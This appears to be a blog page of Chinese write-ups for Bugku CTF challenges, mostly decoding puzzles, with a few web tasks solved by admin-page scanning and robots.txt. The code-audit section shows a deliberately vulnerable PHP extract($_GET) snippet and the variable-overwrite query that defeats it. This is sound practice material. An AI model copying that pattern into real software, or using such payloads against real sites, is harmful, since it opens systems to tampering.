+<h3 id=trim的日记本>Trim的日记本<a hidden class=anchor aria-hidden=true href=#trim的日记本>#</a></h3>
+<blockquote>
+<p>Des:不要一次就放弃。</p>
+</blockquote>
+<p>页面所有功能都能正常使用。</p>
+<p>御剑扫描后台试试。</p>
+<p>扫出<code>show.php</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=login2>login2<a hidden class=anchor aria-hidden=true href=#login2>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=login3>login3<a hidden class=anchor aria-hidden=true href=#login3>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=文件上传2>文件上传2<a hidden class=anchor aria-hidden=true href=#文件上传2>#</a></h3>
+<p>题目已挂。</p>
+<h3 id=江湖魔头>江湖魔头<a hidden class=anchor aria-hidden=true href=#江湖魔头>#</a></h3>
+<p>未解。</p>
+<h3 id=login4>login4<a hidden class=anchor aria-hidden=true href=#login4>#</a></h3>
+<p>未解。</p>
+<h2 id=web进阶>Web进阶<a hidden class=anchor aria-hidden=true href=#web进阶>#</a></h2>
+<h3 id=phpcmsv9>phpcmsV9<a hidden class=anchor aria-hidden=true href=#phpcmsv9>#</a></h3>
+<blockquote>
+<p>Des:flag在根目录里txt文件里。</p>
+</blockquote>
+<p>给出的页面加载不全，查看源码也没啥有用信息。</p>
+<p>看看<code>robots.txt</code>有没有什么信息呢。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=海洋cms>海洋CMS<a hidden class=anchor aria-hidden=true href=#海洋cms>#</a></h3>
+<blockquote>
+<p>Des:flag在根目录某个txt里。</p>
+</blockquote>
+<p>题目已挂。</p>
+<h3 id=小明的博客>小明的博客<a hidden class=anchor aria-hidden=true href=#小明的博客>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>题目已挂。</p>
+<h3 id=bugku-cms1>Bugku-cms1<a hidden class=anchor aria-hidden=true href=#bugku-cms1>#</a></h3>
+<blockquote>
+<p>Des:后台可以getshell哟，flag在根目录。</p>
+</blockquote>
+<p>一串乱码，源码也没信息。</p>
+<p>御剑扫后台，啥也没有，上网看了下<code>wp</code>，题应该被搞坏了。</p>
+<h3 id=maccms-苹果cms>maccms-苹果cms<a hidden class=anchor aria-hidden=true href=#maccms-苹果cms>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>貌似被搞了&mldr;</p>
+<h3 id=bugku-企业管理系统>Bugku-企业管理系统<a hidden class=anchor aria-hidden=true href=#bugku-企业管理系统>#</a></h3>
+<blockquote>
+<p>Des:flag在网站根目录。</p>
+</blockquote>
+<p>题目已挂。</p>
+<h3 id=appcms>appcms<a hidden class=anchor aria-hidden=true href=#appcms>#</a></h3>
+<blockquote>
+<p>Des:flag在根目录。</p>
+</blockquote>
+<p>题目已挂。</p>
+<h3 id=实战2-注入>实战2-注入<a hidden class=anchor aria-hidden=true href=#实战2-注入>#</a></h3>
+<h3 id=bugkucms>bugkucms<a hidden class=anchor aria-hidden=true href=#bugkucms>#</a></h3>
+<h3 id=bugku导航>bugku导航<a hidden class=anchor aria-hidden=true href=#bugku导航>#</a></h3>
+<h3 id=又是一个博客>又是一个博客<a hidden class=anchor aria-hidden=true href=#又是一个博客>#</a></h3>
+<h2 id=misc>Misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h2>
+<h3 id=签到题>签到题<a hidden class=anchor aria-hidden=true href=#签到题>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>关注公众号即可。</p>
+<h3 id=这是一张单纯的图片>这是一张单纯的图片<a hidden class=anchor aria-hidden=true href=#这是一张单纯的图片>#</a></h3>
+<blockquote>
+<p>Des:key{}。</p>
+</blockquote>
+<p>图片没什么，<code>WinHex</code>看看。</p>
+<p>最后一段有<code>Unicode编码</code>。</p>
+<h3 id=隐写>隐写<a hidden class=anchor aria-hidden=true href=#隐写>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>一张图片，查看属性发现为<code>500×420</code>，<code>WinHex</code>修改高度。</p>
+<h3 id=telnet>telnet<a hidden class=anchor aria-hidden=true href=#telnet>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><code>wireshark</code>，搜索<code>flag</code>。</p>
+<h3 id=眼见非实>眼见非实<a hidden class=anchor aria-hidden=true href=#眼见非实>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><code>binwalk</code>发现是<code>zip</code>文件，解压后依次查找<code>flag</code>。</p>
+<h2 id=代码审计>代码审计<a hidden class=anchor aria-hidden=true href=#代码审计>#</a></h2>
+<h3 id=extract变量覆盖>extract变量覆盖<a hidden class=anchor aria-hidden=true href=#extract变量覆盖>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+$flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;xxx&#39;</span>;
+<span style=color:#a6e22e>extract</span>($_GET);
+<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($shiyan)) {
+    $connect <span style=color:#f92672>=</span> <span style=color:#a6e22e>trim</span>(<span style=color:#a6e22e>file_get_contents</span>($flag));
+    <span style=color:#66d9ef>if</span> ($shiyan <span style=color:#f92672>==</span> $content) {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;flag{xxx}&#39;</span>;
+    } <span style=color:#66d9ef>else</span> {
+        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Oh.no&#39;</span>;
+    }
+}
+<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></code></pre></div><p>简单分析得出，只要使<code>$flag</code>和<code>$shiyan</code>两个变量相等即可，使用置空的方式让其相等，这就是覆盖题目的基本思路。</p>
+<p>构造<code>?flag=&shiyan=</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h2 id=分析>分析<a hidden class=anchor aria-hidden=true href=#分析>#</a></h2>
+<h3 id=flag被盗>flag被盗<a hidden class=anchor aria-hidden=true href=#flag被盗>#</a></h3>
+<blockquote>
+<p>Des:flag被盗，赶紧溯源！</p>
+</blockquote>
+<p>给了一个<code>key.pcapng</code>文件，使用记事本打开。</p>
+<p><code>Ctrl+F</code>搜索<code>flag</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h2 id=加密>加密<a hidden class=anchor aria-hidden=true href=#加密>#</a></h2>
+<h3 id=滴答滴>滴答~滴<a hidden class=anchor aria-hidden=true href=#滴答滴>#</a></h3>
+<blockquote>
+<p>Des:-&mldr; -.- -.-. - ..-. &ndash; .. &mldr; -.-.。</p>
+</blockquote>
+<p>很简单的<code>Morse加密</code>，<a href=http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx>摩尔斯电码转换器：在线进行摩尔斯电码和英文字母的相互转换，可以把莫尔斯电码转换为英文字母，也可把英文字母转换为摩尔斯电码 (zhongguosou.com)</a>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=聪明的小羊>聪明的小羊<a hidden class=anchor aria-hidden=true href=#聪明的小羊>#</a></h3>
+<blockquote>
+<p>Des:一只小羊翻过了2个栅栏，KYsd3js2E{a2jda}。</p>
+</blockquote>
+<p>很明显，栅栏加密，<a href=https://www.qqxiuzi.cn/bianma/zhalanmima.php>栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=ok>ok<a hidden class=anchor aria-hidden=true href=#ok>#</a></h3>
+<blockquote>
+<p>Des:Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!
+Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.
+Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!
+Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!
+Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.
+Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
+Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
+Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook.
+Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!
+Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!
+Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?
+Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?
+Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
+Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook.
+Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
+Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.
+Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook.
+Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
+Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
+Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</p>
+</blockquote>
+<p>没看懂这是啥&mldr;再好好想想。</p>
+<p>这是啥，<code>Ook编码</code>&mldr;<a href=https://www.splitbrain.org/services/ook>https://www.splitbrain.org/services/ook</a>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=这不是摩斯密码>这不是摩斯密码<a hidden class=anchor aria-hidden=true href=#这不是摩斯密码>#</a></h3>
+<blockquote>
+<p>Des:下载看看吧。</p>
+</blockquote>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173710438.png alt=image-20210311173710438>
+</p>
+<p>这是<code>Brainfuck编码</code>&mldr;<a href=https://www.splitbrain.org/services/ook>https://www.splitbrain.org/services/ook</a>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=easy_crypto>easy_crypto<a hidden class=anchor aria-hidden=true href=#easy_crypto>#</a></h3>
+<blockquote>
+<p>Des:0010 0100 01 110 1111011 11 11111 010 000 0 001101 1010 111 100 0 001101 01111 000 001101 00 10 1 0 010 0 000 1 01111 10 11110 101011 1111101。</p>
+</blockquote>
+<p>摩斯加密，上脚本。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173726315.png alt=image-20210311173726315>
+</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=简单加密>简单加密<a hidden class=anchor aria-hidden=true href=#简单加密>#</a></h3>
+<blockquote>
+<p>Des:e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA。</p>
+</blockquote>
+<p>这是啥&mldr;</p>
+<p><code>A</code>的ASCII码值为<code>65</code>，<code>=</code>的ASCII码值为<code>61</code>，最后是两个<code>A</code>，可能是凯撒加密后的<code>Base64</code>编码。</p>
+<p>附上凯撒解密脚本。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173741679.png alt=image-20210311173741679>
+</p>
+<p>获得字符串<code>a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==</code>，<a href=https://base64.us/>Base64 在线编码解码 | Base64 加密解密 - Base64.us</a>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=散乱的密文>散乱的密文<a hidden class=anchor aria-hidden=true href=#散乱的密文>#</a></h3>
+<blockquote>
+<p>Des:lf5{ag024c483549d7fd@@1}，一张纸条上凌乱的写着2 1 6 5 3 4。</p>
+</blockquote>
+<p>试了试栅栏解密的分组数，不对。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=凯撒部长的奖励>凯撒部长的奖励<a hidden class=anchor aria-hidden=true href=#凯撒部长的奖励>#</a></h3>
+<blockquote>
+<p>Des:就在8月，超师傅出色地完成了上级的特遣任务，凯撒部长准备给超师傅一份特殊的奖励，兴高采烈的超师傅却只收到一长串莫名的密文，超师傅看到英语字串便满脸黑线，帮他拿到这份价值不菲的奖励吧。 密文：MSW{byly_Cm_sIol_lYqUlx_yhdIs_Cn_Wuymul_il_wuff_bcg_pCwnIl_cm_u_Yrwyffyhn_guh_cz_sio_quhn_ni_ayn_bcm_chzilguncihm_sio_wuh_dich_om}。</p>
+</blockquote>
+<p><a href=https://www.qqxiuzi.cn/bianma/kaisamima.php>凯撒密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a>，一位一位尝试，位移<code>20</code>时得出<code>flag</code>。</p>
+<h3 id=一段base64>一段Base64<a hidden class=anchor aria-hidden=true href=#一段base64>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>给了一大段的<code>Base64</code>编码，就不贴上来了。</p>
+<p>解码。</p>
+<p>进行<code>Unescape</code>解码。</p>
+<p>十六进制转文本。</p>
+<p>再进行<code>Unescape</code>。</p>
+<p>十进制转文本。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x30;&amp;#x32;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x30;&amp;#x38;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x39;&amp;#x37;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x30;&amp;#x33;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x33;&amp;#x37;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x35;&amp;#x35;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x36;&amp;#x36;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x39;&amp;#x39;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x31;&amp;#x36;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x30;&amp;#x32;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x39;&amp;#x35;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x31;&amp;#x36;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x30;&amp;#x32;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x39;&amp;#x39;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x35;&amp;#x30;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x34;&amp;#x38;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x34;&amp;#x39;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x35;&amp;#x35;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x34;&amp;#x39;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x35;&amp;#x35;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x31;&amp;#x33;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x31;&amp;#x39;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x31;&amp;#x30;&amp;#x31;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x33;&amp;#x37;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x35;&amp;#x35;&amp;#x3b;&amp;#x26;&amp;#x23;&amp;#x36;&amp;#x38;&amp;#x3b;
+</code></pre></div><p><code>HTML</code>解码。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#37;&amp;#55;&amp;#66;&amp;#99;&amp;#116;&amp;#102;&amp;#95;&amp;#116;&amp;#102;&amp;#99;&amp;#50;&amp;#48;&amp;#49;&amp;#55;&amp;#49;&amp;#55;&amp;#113;&amp;#119;&amp;#101;&amp;#37;&amp;#55;&amp;#68;
+</code></pre></div><p><code>HTML</code>解码。</p>
+<pre tabindex=0><code>flag%7Bctf_tfc201717qwe%7D
+</code></pre><p>改为正常的<code>flag</code>格式。</p>
+<h3 id=heading>.!?<a hidden class=anchor aria-hidden=true href=#heading>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174014151.png alt=image-20210311174014151>
+</p>
+<p>再怎么改，也改不掉对<code>Ook</code>的独特记忆，https://www.splitbrain.org/services/ook。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=->+[]-<a hidden class=anchor aria-hidden=true href=#->#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<pre tabindex=0><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;
+++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;.&lt;++ ++[-&gt; ++++&lt; ]&gt;+++ .&lt;+++
+[-&gt;-- -&lt;]&gt;- ----. ++++. &lt;+++[ -&gt;+++ &lt;]&gt;+. &lt;++++ [-&gt;-- --&lt;]&gt; ----- -.&lt;++
++[-&gt;+ ++&lt;]&gt; ++.-. ----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ .---- .&lt;+++ [-&gt;-- -&lt;]&gt;-
+.&lt;+++ +++[- &gt;---- --&lt;]&gt; ----- ----. +.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++
++++++ .&lt;
+</code></pre><p><code>Ook</code>的兄弟，<code>Brainfuck</code>又来了，https://www.splitbrain.org/services/ook。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=奇怪的密码>奇怪的密码<a hidden class=anchor aria-hidden=true href=#奇怪的密码>#</a></h3>
+<blockquote>
+<p>Des:突然天上一道雷电，gndk€rlqhmtkwwp}z。</p>
+</blockquote>
+<p><code>g n d k</code>的ASCII码值分别为<code>103 110 100 107</code>。</p>
+<p><code>f l a g</code>的ASCII码值分别为<code>102 108 97 103</code>。</p>
+<p>发现了规律，上<code>python</code>。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;gndk€rlqhmtkwwp}z&#39;</span>
+i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+<span style=color:#66d9ef>while</span> i <span style=color:#f92672>&lt;</span> len(s):
+    num <span style=color:#f92672>=</span> ord(s[i]) <span style=color:#f92672>-</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
+    flag <span style=color:#f92672>+=</span> chr(num)
+    i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
+print(flag)
+</code></pre></div><p>获得<code>flag</code>。</p>
+<h3 id=托马斯杰斐逊>托马斯.杰斐逊<a hidden class=anchor aria-hidden=true href=#托马斯杰斐逊>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174101544.png alt=image-20210311174101544>
+</p>
+<p>这个之前有做过。</p>
+<p>先根据密钥对各行进行替换。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174117632.png alt=image-20210311174117632>
+</p>
+<p>然后根据密文，对第一列元素进行排列，对每行元素进行循环。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174129244.png alt=image-20210311174129244>
+</p>
+<p>唯一读的通顺的就是倒数第六列：<code>XSXSBUGKUADMIN</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=zip伪加密>zip伪加密<a hidden class=anchor aria-hidden=true href=#zip伪加密>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>题目给了一个压缩包，打开里面的<code>flag.txt</code>文档需要密码，当然这里说了伪加密。</p>
+<p>先来分析一下ZIP文件的三个组成部分：</p>
+<pre tabindex=0><code>压缩源文件数据区：
+50 4B 03 04：这是头文件标记（0x04034b50）
+14 00：解压文件所需 pkware 版本
+00 00：全局方式位标记（有N/A加密）
+08 00：压缩方式
+5A 7E：最后修改文件时间
+F7 46：最后修改文件日期
+16 B5 80 14：CRC-32校验（1480B516）
+19 00 00 00：压缩后尺寸（25）
+17 00 00 00：未压缩尺寸（23）
+07 00：文件名长度
+00 00：扩展记录长度
+ 
+压缩源文件目录区：
+50 4B 01 02：目录中文件文件头标记(0x02014b50)
+3F 00：压缩使用的 pkware 版本
+14 00：解压文件所需 pkware 版本
+00 00：全局方式位标记（有N/A加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）
+08 00：压缩方式
+5A 7E：最后修改文件时间
+F7 46：最后修改文件日期
+16 B5 80 14：CRC-32校验（1480B516）
+19 00 00 00：压缩后尺寸（25）
+17 00 00 00：未压缩尺寸（23）
+07 00：文件名长度
+24 00：扩展字段长度
+00 00：文件注释长度
+00 00：磁盘开始号
+00 00：内部文件属性
+20 00 00 00：外部文件属性
+00 00 00 00：局部头部偏移量
+ 
+压缩源文件目录结束标志：
+50 4B 05 06：目录结束标记
+00 00：当前磁盘编号
+00 00：目录区开始磁盘编号
+01 00：本磁盘上纪录总数
+01 00：目录区中纪录总数
+59 00 00 00：目录区尺寸大小
+3E 00 00 00：目录区对第一张磁盘的偏移量
+00 00：ZIP 文件注释长度
+</code></pre><p>找到头文件标记<code>50 4B 03 04</code>与文件头标记<code>50 4B 01 02</code>，将后面对应的全局方式位标记<code>00 09</code>改为<code>00 00</code>破解伪加密，保存后成功打开<code>flag.txt</code>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=告诉你个秘密>告诉你个秘密<a hidden class=anchor aria-hidden=true href=#告诉你个秘密>#</a></h3>
+<blockquote>
+<p>Des:636A56355279427363446C4A49454A7154534230526D6843
+56445A31614342354E326C4B4946467A5769426961453067。</p>
+</blockquote>
+<p>数字范围<code>0-9</code>，字母范围<code>A-E</code>。</p>
+<p>十六进制转字符串。</p>
+<pre tabindex=0><code>cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g
+</code></pre><p><code>Base64</code>转字符串。</p>
+<pre tabindex=0><code>r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM
+</code></pre><p>这个东西，看看键盘，刚好把中间的键给围了起来。</p>
+<pre tabindex=0><code>TONGYUAN
+</code></pre><p>获得<code>flag</code>。</p>
+<h3 id=这不是md5>这不是md5<a hidden class=anchor aria-hidden=true href=#这不是md5>#</a></h3>
+<blockquote>
+<p>Des:666c61677b616537333538376261353662616566357d。</p>
+</blockquote>
+<p>数字范围<code>1-8</code>，字母范围<code>b-d</code>。</p>
+<p>十六进制转文本。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=贝斯家族>贝斯家族<a hidden class=anchor aria-hidden=true href=#贝斯家族>#</a></h3>
+<blockquote>
+<p>Des:@iH&lt;,{bdR2H;i6*Tm,Wx2izpx2!。</p>
+</blockquote>
+<p>都说了是<code>Base</code>编码了，本菜鸟一个个试，试出来是<code>Base91</code>编码，进行解码。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=富强民主>富强民主<a hidden class=anchor aria-hidden=true href=#富强民主>#</a></h3>
+<blockquote>
+<p>Des:公正公正公正诚信文明公正民主公正法治法治友善平等和谐敬业和谐富强和谐富强和谐文明和谐平等公正公正和谐法治公正公正公正文明和谐民主和谐敬业和谐平等和谐敬业和谐敬业和谐和谐和谐公正法治友善法治。</p>
+</blockquote>
+<p>这个&mldr;查了一下，这是核心价值观编码。<a href=http://ctf.ssleye.com/cvencode.html>CTF在线工具-在线核心价值观编码|核心价值观编码算法|Core Values Encoder (ssleye.com)</a>。</p>
+<p>获得<code>flag</code>。</p>
+<h3 id=python>python<a hidden class=anchor aria-hidden=true href=#python>#</a></h3>
+<blockquote>
+<p>Des:N/A。</p>
+</blockquote>
+<p>给了两个<code>python</code>代码，附上：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174155087.png alt=image-20210311174155087>
+</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174208746.png alt=image-20210311174208746>
+</p>
+<p>暂时解不出&mldr;</p>
+<h3 id=进制转换>进制转换<a hidden class=anchor aria-hidden=true href=#进制转换>#</a></h3>
+<blockquote>
+<p>Des:二进制、八进制、十进制、十六进制，你能分的清吗？</p>
+</blockquote>
+<pre tabindex=0><code>d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e
+</code></pre><p>思路：先把所有数据转换为统一的形式，再转换为字符串。这里转为十六进制。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174250846.png alt=image-20210311174250846>
+</p>
+<p>十六进制转字符串。</p>
